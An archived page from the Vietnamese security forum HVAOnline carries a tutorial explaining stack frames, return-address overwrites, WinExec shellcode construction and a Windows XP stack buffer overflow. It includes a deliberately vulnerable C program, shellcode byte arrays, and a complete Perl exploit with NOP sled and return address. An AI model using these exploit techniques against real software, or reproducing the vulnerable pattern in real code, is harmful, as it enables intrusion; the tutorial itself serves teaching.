<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="description" content="HVA discussion board">
<meta name="keywords" content="Messages posted by seamoun, jforum, jforum java, jforum forum, forum java, java jforum, java forum, forum, rafael steil, bulletin board, java bb, javabb, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title>Messages posted by seamoun - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0">
	<tr>
		<td>
			<table cellspacing="0" cellpadding="0" width="100%" border="0">
				<tr>			
        <td>&nbsp;
			</td>
		
        <td width="100%" align="center" valign="middle">
						<p><a href="http://www.hvaonline.net" title="[Logo]">
								<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" />
							<br>
            				</a><span class="maintitle"></span>
						</p>
          <table cellspacing="0" cellpadding="2" border="0">
							<tr>
								
              <td valign="top" nowrap="nowrap" align="center">
			  						<a href="/hvaonline/forums/rule.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_rule.gif" alt="[Rule]" title="[Rule]"></a>
									<a id="rule" class="topmenu" href="/hvaonline/forums/rule.html">Rules</a>&nbsp;
									
									<a class="topmenu" href="/hvaonline/forums/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_groups.gif" alt="[Home]" title="[Home]"></a>
										<a id="backtosite" class="topmenu" href="/hvaonline/forums/list.html">Main Forum</a>&nbsp;

										<a class="topmenu" href="/hvaonline/portal/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_portal.gif" alt="[Portal]" title="[Portal]"></a>
										<a id="portalsite" class="topmenu" href="/hvaonline/portal/list.html">Portal</a>&nbsp;&nbsp;
									<br>
									
										<a href="/hvaonline/user/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_members.gif" alt="[Members]" title="[Members]"></a>
										<a id="users" class="topmenu" href="/hvaonline/user/list.html">Member Listing</a>&nbsp;
										
										<a href="/hvaonline/forums/stats.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_stats.gif" alt="[Statistics]" title="[Statistics]"></a>
										<a id="stats" class="topmenu" href="/hvaonline/forums/stats.html">Statistics</a>&nbsp;
										
										<a href="/hvaonline/search/filters.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_search.gif" alt="[Search]" title="[Search]"></a>
										<span class="mainmenu"><a id="search" class="topmenu" href="/hvaonline/search/filters.html"><b>Search</b></a>&nbsp;
									
										<a href="/book/"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_book.gif" alt="[Reading Room]" title="[Reading Room]"></a> 
										<a class="topmenu" href="/hvaonline/readingRoom/list.html">Reading Room</a>&nbsp;

									
									<span class="topmenu"> 
										

	
										<br>
											<a id="register" class="topmenu" href="/hvaonline/user/insert.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_register.gif" border="0" alt="[Register]" title="[Register]"> 
												Register</a>&nbsp;&nbsp;</span>
											<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_login.gif" border="0" alt="[Login]" title="[Login]"> 
											<strong>Login</strong> [&nbsp;
											<a id="login" class="topmenu" href="/hvaonline/user/login.html">http</a>&nbsp;
											|
											<a id="logins" class="topmenu" href="https://www.hvaonline.net/hvaonline/user/logins.html">https </a>&nbsp;]</span>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td>

<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post_show.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post.js"></script>
<script type="text/javascript">
<!--

function showEmail(beforeAt, afterAt)
{
	return beforeAt + "@" + afterAt;
}

var starOn=new Image();
starOn.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_on.gif";

var starOff=new Image();
starOff.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_off.gif";

function writeStars(q, postId)
{
	for (var i = 0; i < 5; i++) {
		var name = "star" + postId + "_" + i;
		document.write("<img name='" + name + "' alt='*' />");
		document.images[name].src = q > i ? starOn.src : starOff.src;
	}
}

function addBookmark(relationType, relationId)
{
	var w = window.open('/hvaonline/bookmarks/insert/' + relationType + '/' + relationId + '.html', 'bookmark_add', 'width="700", height="100", scrollbars="no"');
	w.focus();
}

function supportAjax()
{
	if (typeof(AjaxUtils) != 'undefined') {
		if (window.ActiveXObject) {
			var r = new ActiveXObject("Microsoft.XMLHTTP");
			return r != undefined;
		}
		else if (window.XMLHttpRequest) {
			return true;
		}
	}

	return false;
}

-->
</script>

<table cellspacing="0" cellpadding="10" width="98%" align="center" border="0">
	<tr>
		<td class="bodyline">
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					<td valign="middle" align="left" colspan="2">
						<span class="maintitle"><a href="/hvaonline/posts/listByUser/332.html" name="top" class="maintitle" id="top">Messages posted by: seamoun</a></span>
						&nbsp;<a href="/hvaonline/rss/showPostsByUser/332.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/xml_button.gif" border="0" alt="XML" /></a>
					</td>
				</tr>
			</table>
			
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						<a href="/hvaonline/user/profile/332.html">Profile for seamoun</a> 
            			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"><a href="/hvaonline/posts/listByUser/332.html">Messages posted by seamoun</a>
						</span>
					</td>
										
					<td valign="middle" align="right">
						<span class="nav">[ number of posts not being displayed on this page: <span class="moderator">25</span> ]</span>
					</td>
				</tr>
			</table>

			
      <table class="forumline" cellspacing="1" cellpadding="3" width="100%" border="0">
        <tr>
          <th height="26" nowrap="nowrap" class="thleft">&nbsp;</th>
        </tr>

				
        <!-- POST LISTING -->
         
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/26195.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/26195/158915.html#158915,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><font color='orange'><b><font size='+1'>I. CHƯƠNG TRÌNH KHI NẠP TRONG BỘ NHỚ</font></b></font><br/> Khi những tiến trình được nạp đến bộ nhớ, chúng chia thành 6 phân đoạn như sau:<br/> <b>1) Phân đoạn .text</b><br/> Phân đoạn này tương ứng là phần của file thực thi nhị phân. Nó chứa các chỉ thị lệnh (mã máy) để thực hiện các tác vụ của chương trình. Phân đoạn này được đánh dấu là chỉ đọc và sẽ gây ra lỗi nếu như ghi trên phân đoạn này. Kích thước là cố định tại lúc thực thi khi tiến trình lần đầu tiên được nạp.<br/> <b>2) Phân đoạn .data</b><br/> Là phân đoạn được sử dụng để lưu trữ các biến toàn cục và có khởi tạo giá trị ban đầu như là: int a=0;<br/> Kích thước này cũng có định tại lúc thực thi chương trình<br/> <b>3) Phân đoạn .bss</b><br/> Below stack section (.bss) là được sử dụng để lưu trữ các biến toàn cục nhưng không có khởi tạo giá trị ban đâu như là : int a;<br/> Kích thước của phân đoạn này cũng cố định lúc thực thi chương trình.<br/> <b>4) Phân đoạn Heap</b><br/> Phân đoạn này được sử dụng để cấp phát các biến động và phát triển từ vùng địa chỉ thấp đến vùng địa chỉ cao trong bộ nhớ. Trong ngôn ngữ C thì việc cấp phát và giải phóng được thực hiện qua hai hàm malloc() và free(). Ví dụ:<br/> int i = malloc(sizeof (int));<br/> <b>5) Phân đoạn Stack</b><br/> Phân đoạn stack có tác dụng giữ những lời gọi hàm trong thủ tục đệ quy và phát triển theo địa chỉ vùng nhớ cao đến địa chỉ vùng nhớ thấp trên hầu hết các hệ thống.<br/> <b>6) Phân đoạn biến môi trường và đối số</b><br/> Phân đoạn này lưu trữ một bản sao chép các biến cấp độ hệ thống mà có thể được yêu cầu bởi tiến trình trung quá trình thực thi. Phân đoạn này có khả năng ghi được.<br/><br/> <br>
<div align="center" class="limitview"><img src='http://i359.photobucket.com/albums/oo34/smpoke/h1-1.jpg' border="0" /></div><br/> Ví dụ một đoạn chương trình<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>/* memory.c */ // this comment simply holds the program name
int index = 5; // giá trị này được lưu tại phân đoạn data bởi vì nó có giá trị khởi tạo.
char * str; // giá trị này được lưu tại phân đoạn bss vì nó không có giá trị khởi tạo ban đầu.
void funct1&#40;int c&#41;{ // bracket starts function1 block
int i=c; // được lưu trong phân đoạn stack.
str = &#40;char*&#41; malloc &#40;10 * sizeof &#40;char&#41;&#41;; // Dành 10 ký tự trong vùng nhớ Heap.
strncpy&#40;str, "abcde", 5&#41;; //copies 5 characters "abcde" into str
} //end of function1
void main &#40;&#41;{ //the required main function
funct1&#40;1&#41;; //main calls function1 with an argument
} //end of the main function</pre>
</div><br/> <font color='orange'><b><font size='+1'>II. GIẢI THÍCH CƠ CHẾ LÀM VIỆC CỦA NGĂN XẾP (STACK)</font></b></font><br/> <b>1) Cho đoạn chương trình sau</b>:<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>int f&#40;int a,int b,int c&#41;;
int main&#40;&#41;
{
f&#40;1,2,3&#41;;
return 0;
}
int f&#40;int a,int b,int c&#41;
{
int i;
char buf&#91;3&#93;;
i=5;
buf&#91;0&#93;='A';
buf&#91;1&#93;='B';
buf&#91;2&#93;='C';
return &#40;a+i&#41;;
}</pre>
</div><br/><br/> <b>2) Mã Assembly của hai hàm trên như sau:</b><br/><br/> <br>
<div align="center" class="limitview"><img src='http://i359.photobucket.com/albums/oo34/smpoke/h2.jpg' border="0" /></div><br/> <b>3) Giải thích mã Assembly của chương trình</b><br/> Khi hệ thống chuyển điều khiển cho chương trình nó sẽ lưu địa chỉ trở về như sau<br/> push ebp<br/> mov ebp,esp<br/> Khi gọi hàm f(1,2,3) với ba đối số kiểu int thì các bước chuẩn bị để gọi hàm như sau<br/> a) Đẩy các tham số của hàm vào stack theo thứ tự sau<br/> push 3<br/> push 2<br/> push 1<br/> - Tại sao nó lại đẩy theo thứ tự như vậy, bởi vì cơ chế làm việc của stack là vào sau ra trước. Như vậy khi push các tham số như trên sẽ đúng thứ tự của tham số khi gọi hàm<br/> b) Gọi hàm<br/> call f<br/> - Khi gọi hàm f thì địa chỉ câu lệnh tiếp theo của lệnh gọi hàm f sẽ được đẩy vào stack và quyền điều khiển lúc này được trao cho hàm f()<br/> c) Quá trình thực thi hàm f() như sau<br/> - Đầu tiên ebp được đẩy vào stack, lúc này esp trỏ đến địa chỉ cũ của ebp. Tiếp đến ebp được gán bởi esp. Như vậy là esp, và ebp đều trỏ đến địa chỉ cũ của ebp. Sau đó chương trình cấp phát vùng nhớ cho 4 biến cục bộ. Biến i (4 bytes) và 3 biến char mỗi biến là 1 byte. Tổng cộng là 7 bytes nhưng được làm tròn thành 8 bytes<br/> push ebp<br/> mov ebp, esp<br/> sub esp, 8<br/> - Sau đó các biến cục bộ được gán giá trị như sau. Đầu tiên là biến i tiếp đến là 3 kí tự<br/> mov dword ptr [ebp-4], 5<br/> mov byte ptr [ebp-8], 'A'<br/> mov byte ptr [ebp-7], 'B'<br/> mov byte ptr [ebp-6], 'C'<br/><br/> - EBP đang trỏ đến ô nhớ chứa giá trị EBP cũ. ESP sẽ được gán bằng EBP. Như vậy ESP đang trỏ đến ô nhớ chứa giá trị EBP cũ. Tiếp theo, lệnh pop sẽ lấy giá trị của EBP cũ vào EBP, ESP trỏ đến ô nhớ chứa địa chỉ trở về. Lệnh ret sẽ lấy địa chỉ trở về vào EIP và quyền điều khiển chương trình được chuyển giao cho hàm main(), ESP trỏ đến ô nhớ chứa tham số đầu tiên của hàm f().<br/> mov esp,ebp<br/> pop ebp<br/> ret<br/> - Qua đoạn quá trình thực thi của hàm f ta thấy được rằng là thanh ghi ebp dùng để tham chiếu các biến cục bộ và tham số của hàm của hàm f<br/> Tham chiếu đến tham số: ebp+???<br/> Tham chiếu đến biến cục bộ ebp-???<br/> Lưu ý: Vùng stack làm việc từ vùng nhớ cao đến vùng nhớ thấp tức là thanh ghi esp được trỏ ở đỉnh của ngăn xếp cho nến quá trình cấp phát ô nhớ sẽ được thực hiện từ vùng nhớ cao đến vùng nhớ thấp. Mỗi lần được cấp phát thì địa chỉ esp sẽ giảm tương ứng với kiểu của biến.<br/> Sơ đồ biểu diễn stack đối với chương trình trên như sau<br/><br/> <br>
<div align="center" class="limitview"><img src='http://i359.photobucket.com/albums/oo34/smpoke/h3.jpg' border="0" /></div><br/><br/> <b>4) Ghi đè lên địa chỉ trở về trong ngăn xếp</b><br/> Ví dụ sau đây sẽ cho thấy cách ghi đè lên địa chỉ trở về trong ngăn xếp.<br/> a) Ví dụ<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>#include &lt;stdio.h&gt;
void func2&#40;&#41;
{
printf&#40;"Hello everybody !\n"&#41;;
exit&#40;1&#41;;
}
void func1&#40;&#41;
{
int buf&#91;1&#93;;
buf&#91;2&#93;=&#40;int&#41;func2;
}
void main&#40;&#41;
{
func1&#40;&#41;;
}</pre>
</div><br/> Sau khi chạy chương trình nó sẽ xuất hiện trên màn hình là dòng chữ “Hello everybody”.<br/> Hàm func2() đã ghi đè địa chỉ trở về của hàm func1, cho nên thực hiện func2 và thóat chương trình.<br/> b) Giải thích<br/> Trong hàm main chỉ gọi mỗi hàm func1() và quy trình làm khởi tạo và làm việc của hàm func1() giống các thao tác của hàm f() trên như đã giới thiệu phần trước.<br/> - Đầu tiên đẩy (push) các đối số (Ở đây là không có đối số nào)<br/> - Sau đó là đẩy (push) địa chỉ trở về vào ngăn xếp<br/> - Đẩy giá trị ebp vào stack<br/> - Cấp phát biến cục bộ cho hàm func1(Ở đây chỉ có một biến kiểu int )<br/> Chú ý đến stack bây giờ có những gì trong đó có :<br/> 1) Địa chỉ trở về<br/> 2) Địa chỉ ebp cũ<br/> 3) Địa chỉ của biến buf mà ở đây là buf[0] (Mảng trong C được đánh số từ 0)<br/> Như vậy buf[0] tức là biến cục bộ của hàm test_proc, buf[1] là địa chỉ của ebp cũ, buf[2] là địa chỉ trở về của hàm<br/> Câu lệnh buf[2]=int func2 đã ghi đè địa chỉ trở về của hàm func1. Do đó đáng lẽ là hàm func1() sau khi thực thi xong sẽ quay về main nhưng địa chỉ trở về của nó đã bị ghi đè nên gọi tiếp hàm func2().<br/><br/> <br>
<div align="center" class="limitview"><img src='http://i359.photobucket.com/albums/oo34/smpoke/h4.jpg' border="0" /></div><br/> <b><font color='orange'><font size='+1'>III. GIỚI THIỆU SHELLCODE </font></font></b><br/> <b>1) Định nghĩa</b><br/> Theo định nghĩa của wikipedia.org thì shellcode là “In computer security, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability”.<br/> <b>2) Cách tạo một shellcode</b><br/> Ví dụ sau sẽ hướng dẫn cách tạo một shellcode với hàm WinExec.<br/> Hàm WinExec là hàm thực thi một ứng dụng, với đối số đầu vào là tên file ứng dụng và cách hiển thị khi ứng dụng được thi thực thi (thực thi ứng dụng có thể ở dạng ẩn, bình thường, …).<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>Chi tiết về hàm WinExec
UINT WINAPI WinExec&#40;
__in LPCSTR lpCmdLine,
__in UINT uCmdShow
&#41;;</pre>
</div><br/> Chi tiết về hàm có thể tham khảo tại:<br/> (<span class="link"> http://msdn.microsoft.com/en-us/library/ms687393(VS.85).aspx</span>)<br/> Giả sử sử dụng hàm WinExec để thực thi calc.exe(Calculator trong Windows) với hàm WinExec. Khi viết bằng ngôn ngữ C thì nó sẽ như sau:<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>#include &lt;windows.h&gt;
int main&#40;&#41;
{
char fname&#91;10&#93;="calc";
WinExec&#40;fname,1&#41;;
return 0;
}</pre>
</div><br/> Với cách gọi hàm WinExec như trên thì khi viết lại bằng ngôn ngữ Assembly for Windows thì dựa theo cách đã trình bày ở phần II được viết như sau:<br/> Trước hết cần biết địa chỉ của hàm WinExec trong thư viện kernel32.dll.<br/> Đoạn mã sau cho biết địa chỉ của một hàm trong một thư viện đã chỉ định<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
int main&#40;int argc,char *argv&#91;&#93;&#41;
{
if &#40;argc&lt;3&#41;
{
printf&#40;"Cu phap: %s &lt;Ten dll&gt; &lt;Ten ham&gt; \n",argv&#91;0&#93;&#41;;
printf&#40;"Vi du: %s kernel32.dll WinExec",argv&#91;0&#93;&#41;;
return 0;
}
HINSTANCE hDll;
hDll=LoadLibrary&#40;argv&#91;1&#93;&#41;;
if &#40;hDll!=0&#41;
{
FARPROC fp;
fp=GetAddressProc&#40;hDll,argv&#91;2&#93;&#41;
if &#40;fp!=0&#41;
printf&#40;"Dia chi cua ham %s la : 0x%x",argv&#91;1&#93;,fp&#41;;
else
printf&#40;"Khong tim thay ham %s trong thu vien %s",argv&#91;2&#93;,argv&#91;1&#93;&#41;;
}
}</pre>
</div><br/> Sau khi biên dịch và chạy đoạn chương trình trên với đối số là tên thư viện và hàm WinExec có kết quả hàm WinExec ở tại: 0x7c86114d (WindowsXp SP2) và hàm ExitProcess tại địa chỉ 0x7c81caa2 (WindowsXp SP2).<br/> Đoạn mã Assembly như sau:<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>void main&#40;&#41;
{
__asm{
xor eax,eax
push eax
sub esp,4
mov &#91;ebp-8&#93;,'c'
mov &#91;ebp-7&#93;,'a'
mov &#91;ebp-6&#93;,'l'
mov &#91;ebp-5&#93;,'c'
push eax
lea eax,&#91;ebp-8&#93;
push eax
mov eax,0x7c86114d
call eax
mov eax,0x7c81caa2
call eax
}
}</pre>
</div><br/> Khi biên dịch và chạy với mã Assembly trên thì không khác gì với việc hàm viết trong C. Nhưng ở đây được viết bằng Assembly for Windows. Sở dĩ phải viết hàm bằng ngôn ngữ Assembly vì cho phép nắm rõ cách tạo hàm và gọi hàm trong Assembly for Windows và lấy được mã máy khi sử dụng chương trình OllyDbg, sau đây là mã máy của đoạn Assembly trên.<br/><br/><br/> <br>
<div align="center" class="limitview"><img src='http://i359.photobucket.com/albums/oo34/smpoke/h5.jpg' border="0" /></div><br/> Trên hình vẽ sẽ có được mã máy tương ứng với mã Assembly, bây giờ xây dựng shellcode và thực thi từ mã máy này như sau:<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>unsigned char scode&#91;&#93; =
"\x55\x8B\xEC\x33\xC0\x50\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45\xF9\x61\xC6\x45\xFA\x6C\xC6\x45\xFB\x63\x50\x8D\x45\xF8\x50\xB8\x4D\x11\x86\x7C\xFF\xD0\xB8\xA2\xCA\x81\x7C\xFF\xD0\x5D\xC3";
int main&#40;int argc, char *argv&#91;&#93;&#41;
{
int *ret;
ret=&#40;int *&#41;&ret+2;// Ghi đè địa chỉ trở về của hàm main
&#40;*ret&#41;=&#40;int&#41;scode;// Giá trị của con trỏ ret trỏ đến là giá trị của biến scode
return 0;
}</pre>
</div><br/><br/> Với cách trên hướng dẫn tự tạo shellcode riêng, tuy nhiên một site chuyên cung cấp các loại shellcode nổi tiếng cùng với framework của nó là metasploit.com. Tại đây có thể tìm thấy rất nhiều loại shellcode khác nhau. Với shellcode của hàm WinExec trên có thể tìm thấy tại<br/> (<span class="link"> http://www.metasploit.com:55555/PAYLOADS?MODE=SELECT&MODULE=win32_exec</span>)<br/> /* win32_exec - EXITFUNC=process CMD=calc Size=160 Encoder=PexFnstenvSub<span class="link"> http://metasploit.com</span> */<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>unsigned char scode&#91;&#93; =
"\x31\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x0d"
"\x5a\x9f\x07\x83\xeb\xfc\xe2\xf4\xf1\xb2\xdb\x07\x0d\x5a\x14\x42"
"\x31\xd1\xe3\x02\x75\x5b\x70\x8c\x42\x42\x14\x58\x2d\x5b\x74\x4e"
"\x86\x6e\x14\x06\xe3\x6b\x5f\x9e\xa1\xde\x5f\x73\x0a\x9b\x55\x0a"
"\x0c\x98\x74\xf3\x36\x0e\xbb\x03\x78\xbf\x14\x58\x29\x5b\x74\x61"
"\x86\x56\xd4\x8c\x52\x46\x9e\xec\x86\x46\x14\x06\xe6\xd3\xc3\x23"
"\x09\x99\xae\xc7\x69\xd1\xdf\x37\x88\x9a\xe7\x0b\x86\x1a\x93\x8c"
"\x7d\x46\x32\x8c\x65\x52\x74\x0e\x86\xda\x2f\x07\x0d\x5a\x14\x6f"
"\x31\x05\xae\xf1\x6d\x0c\x16\xff\x8e\x9a\xe4\x57\x65\x24\x47\xe5"
"\x7e\x32\x07\xf9\x87\x54\xc8\xf8\xea\x39\xfe\x6b\x6e\x5a\x9f\x07";</pre>
</div><br/><br/> <b><font size='+1'><font color='orange'>III. LỖI TRÀN STACK (BUFFER OVERFLOW)</font></font></b><br/> <b>1) Giới thiệu</b><br/> Lỗi tràn stack xuất hiện khi bộ đệm lưu trữ giữ liệu trong bộ nhớ không kiểm soát việc ghi giá trị trên nó, dẫn đến tràn stack và việc tràn stack này dẫn đến việc ghi đè địa chỉ trở về của hàm.<br/> Để hiểu rõ về tràn stack như thế nào. Cho một ví dụ sau có lỗi tràn stack (buffer overflow)<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>//File vul.c
#include &lt;stdio.h&gt;
greeting&#40;char *temp1, char *temp2&#41; {
char name&#91;400&#93;;
strcpy&#40;name, temp2&#41;;
printf&#40;"Hello %s %s\n", temp1, name&#41;;
}
main&#40;int argc, char *argv&#91;&#93;&#41;{
greeting&#40;argv&#91;1&#93;, argv&#91;2&#93;&#41;;
printf&#40;"Bye %s %s\n", argv&#91;1&#93;, argv&#91;2&#93;&#41;;
}</pre>
</div><br/> Nhiệm vụ của chương trình đơn giản là thực hiện nhận hai tham số và chuyển cho hàm getting(), tại hàm getting() có sử dụng một hàm strcpy có nhiệm vụ copy biến temp2 đến biến name. Tại đây biến name chỉ được cấp phát 400 byte. Do vậy nếu như biến temp2 không lớn hơn 400 thì không có việc gì xảy ra, ngược lại nếu như biến temp2 có giá trị lớn 400, thì nó sẽ lần lượt ghi đè lên địa chỉ EBP và EIP, vì sao nó lại ghi đè lên hai địa chỉ này thì như đã giới thiệu trong phần cách hoạt động của stack. Từ đây có thể khai thác lỗi tràn stack và lần lượt thực hiện viết các mã khai thác như sau:<br/> Giả sử lần lượt đệ trình dữ liệu cho đối số đầu vào sử dụng Perl script như sau:<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>perl -e "exec 'vul',’Mr’,&#40;'A'x400&#41;" Chương trình sẽ không xuất hiện lỗi.
perl -e "exec 'vul',’Mr’,&#40;'A'x404&#41;" Xuất hiện lỗi do ghi đè lên địa chỉ của EBP.
perl -e "exec 'vul',’Mr’,&#40;'A'x408&#41;" Xuất hiện lỗi do ghi đè lên địa chỉ của EIP.</pre>
</div><br/> <b>2) Khai thác</b><br/> Để khai thác lỗi tràn bộ đệm của chương trình, bộ đệm của chương trình sẽ được đổ “rác” với lệnh NOP (0x90 – lệnh không làm gì) và địa chỉ trở về EIP được ghi bởi địa chỉ của ESP.<br/> Đoạn mã sau sẽ tìm địa chỉ ESP<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>get_sp&#40;&#41; { __asm mov eax, esp }
int main&#40;&#41;{
printf&#40;"Stack pointer &#40;ESP&#41;: 0x%x\n", get_sp&#40;&#41;&#41;;
}</pre>
</div><br/> Khi chạy chương trình có được địa chỉ ESP: 0x12ff68 (WindowsXP SP2). Shellcode sử dụng ở đây là shellcode có chiều dài 164byte lấy từ metasploit. Như vậy từ địa chỉ ESP ta phải trừ đi 408 byte từ địa chỉ trở về (cấp phát cho biến name, phần EBP và EIP).<br/> Sơ đồ của quá trình khai thác như sau:<br/> <br>
<div align="center" class="limitview"><img src='http://i359.photobucket.com/albums/oo34/smpoke/h6.jpg' border="0" /></div><br/> Mã khai thác được viết bằng Perl để khai thác chương trình bị lỗi tràn bộ đệm như sau<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre># win32_exec - EXITFUNC=thread CMD=calc.exe Size=164 Encoder=PexFnstenvSub
#http://metasploit.com
my $shellcode =
"\x2b\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xb6".
"\x9d\x6d\xaf\x83\xeb\xfc\xe2\xf4\x4a\x75\x29\xaf\xb6\x9d\xe6\xea".
"\x8a\x16\x11\xaa\xce\x9c\x82\x24\xf9\x85\xe6\xf0\x96\x9c\x86\xe6".
"\x3d\xa9\xe6\xae\x58\xac\xad\x36\x1a\x19\xad\xdb\xb1\x5c\xa7\xa2".
"\xb7\x5f\x86\x5b\x8d\xc9\x49\xab\xc3\x78\xe6\xf0\x92\x9c\x86\xc9".
"\x3d\x91\x26\x24\xe9\x81\x6c\x44\x3d\x81\xe6\xae\x5d\x14\x31\x8b".
"\xb2\x5e\x5c\x6f\xd2\x16\x2d\x9f\x33\x5d\x15\xa3\x3d\xdd\x61\x24".
"\xc6\x81\xc0\x24\xde\x95\x86\xa6\x3d\x1d\xdd\xaf\xb6\x9d\xe6\xc7".
"\x8a\xc2\x5c\x59\xd6\xcb\xe4\x57\x35\x5d\x16\xff\xde\x72\xa3\x4f".
"\xd6\xf5\xf5\x51\x3c\x93\x3a\x50\x51\xfe\x0c\xc3\xd5\xb3\x08\xd7".
"\xd3\x9d\x6d\xaf";
# Từ địa chỉ 0x12ff68-0x198&#40;408 bytes&#41;
my $return_address = "\x68\xFF\x12\x00";
my $nop_before = "\x90" x 24;
my $nop_after = "\x90" x 216;
my $payload = $nop_before.$shellcode.$nop_after.$return_address;
exec 'vul',$payload</pre>
</div><br/><br/> <font color='orange'><font size='+1'><b>IV. CÔNG CỤ VÀ TÀI LIỆU THAM KHẢO</b></font></font><br/> <b>1) Công cụ</b><br/> - OllyDbg – <span class="link"> http://www.ollydbg.de</span>. Thanks <b><font color='orange'>hacknho </font></b>với bản Ollydbg patched <img src="/hvaonline/images/smilies/b0b50d3fc83d45f294693120c22574ab.gif" border="0" alt="smilie" align="absbottom"> <img src="/hvaonline/images/smilies/b0b50d3fc83d45f294693120c22574ab.gif" border="0" alt="smilie" align="absbottom"> <img src="/hvaonline/images/smilies/b0b50d3fc83d45f294693120c22574ab.gif" border="0" alt="smilie" align="absbottom"><br/> <b>2) Tài liệu</b><br/> - “Gray Hat Hacking, Second Edition” - Shon Harris, Allen Harper, Chris Eagle, and Jonathan Ness.<br/> - Metasploit (<span class="link"> http://metasploit.com</span>).<br/><br/> Xong phần I !!! <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"> <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"> <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"> <img src="/hvaonline/images/smilies/bde7cf9049e122a728d29f2213bb2b67.gif" border="0" alt="smilie" align="absbottom"> <img src="/hvaonline/images/smilies/bde7cf9049e122a728d29f2213bb2b67.gif" border="0" alt="smilie" align="absbottom"> . Phần II seamoun sẽ nói rõ hơn về cách khai thác và demo khai thác một ứng dụng bị lỗi buffer overflow.<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
